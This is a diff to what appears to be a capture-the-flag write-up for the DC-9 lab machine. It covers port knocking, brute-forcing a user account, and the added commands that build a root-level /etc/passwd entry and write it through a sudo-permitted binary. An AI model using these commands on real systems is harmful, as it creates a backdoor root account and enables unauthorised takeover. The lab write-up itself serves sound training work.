@@ -52,7 +52,7 @@ in the beginning nmap it said "Filtered ssh" so check for knockd installation an
 <img width="1074" height="547" alt="image" src="https://github.com/user-attachments/assets/10b0931f-2172-4aea-acc4-34114b0b113c" />
 
 Run knock on the sequence then ssh
-knock -v 192.168.58.209 7469 8475 9842
+knock -v $ip 7469 8475 9842
 
 bruteforced into user account janitor
 <img width="677" height="295" alt="image" src="https://github.com/user-attachments/assets/86d4dcb0-cda4-4193-bd57-16c875835942" />
@@ -73,9 +73,13 @@ Matching Defaults entries for fredf on dc-9:
 User fredf may run the following commands on dc-9:
     (root) NOPASSWD: /opt/devstuff/dist/test/test
 
+openssl passwd -1 -salt test1 test1
 
+echo 'test1:$1$test1$7ku3N1r5Q0vH6D4yhEjNk/:0:0::/root:/bin/bash' > /tmp/new_user
 
+sudo /opt/devstuff/dist/test/test /tmp/new_user /etc/passwd
 
+su test1
 
 
 
